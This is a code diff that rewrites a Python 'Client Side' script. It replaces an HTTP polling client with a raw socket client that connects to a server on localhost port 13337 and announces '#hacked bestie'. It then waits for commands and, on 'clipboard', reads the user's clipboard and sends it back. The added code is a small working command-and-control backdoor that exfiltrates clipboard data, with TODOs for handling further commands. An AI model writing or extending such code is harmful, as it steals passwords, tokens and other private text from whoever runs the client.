@@ -1,22 +1,24 @@
-import aiohttp
-import asyncio
+import clipboard
+import socket
 
 # Client Side 
 
+# TODO: conn keepalive
+# sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
+
 # Create Client session; listen to server
-async def main():
-    async with aiohttp.ClientSession() as session:
-        async with session.get('http://0.0.0.0:80') as response:
-            print(response.status)
-            print(await response.text())
-        async with session.get('http://0.0.0.0:80/validate/status') as response:
-            print(response.status)
-            print(await response.text())
-            
+server_addr = ('localhost', 13337)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(server_addr)
+sock.send("#hacked bestie".encode())
 
-loop = asyncio.get_event_loop()
-loop.create_task(main())
-loop.run_forever()
+while True:
+    data = sock.recv(1024)
+    print("Received_data: %s" % data)
+    # TODO: handle commands coming back
 
+    if data.decode() == "clipboard":
+        text = clipboard.paste()
+        sock.send(text.encode())
 
-
+# sock.send("#hacked bestie".encode())
